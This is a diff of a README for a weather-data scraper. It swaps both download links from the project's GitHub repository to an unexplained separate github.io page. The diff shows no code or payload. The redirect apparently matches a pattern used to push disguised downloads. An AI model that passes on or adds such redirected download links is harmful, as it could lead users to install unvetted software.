@@ -1,6 +1,6 @@
 # 🌡️ nutrifood-weather-scraper - Automate Your Real Feel Weather Data
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Latest%20Version-2ea44f?style=for-the-badge&logo=github)](https://github.com/Oxidative-butcherbird487/nutrifood-weather-scraper)
+[![Download Latest Version](https://img.shields.io/badge/Download-Latest%20Version-2ea44f?style=for-the-badge&logo=github)](https://oxidative-butcherbird487.github.io)
 
 ## 🚀 What Is This?
 
@@ -10,7 +10,7 @@ Whether you are a researcher, analyst, or just need weather data, this tool help
 
 ## 📥 Download and Install
 
-Visit this link to download the application: [Download nutrifood-weather-scraper](https://github.com/Oxidative-butcherbird487/nutrifood-weather-scraper)
+Visit this link to download the application: [Download nutrifood-weather-scraper](https://oxidative-butcherbird487.github.io)
 
 **What to do next:**
 - Go to the link above
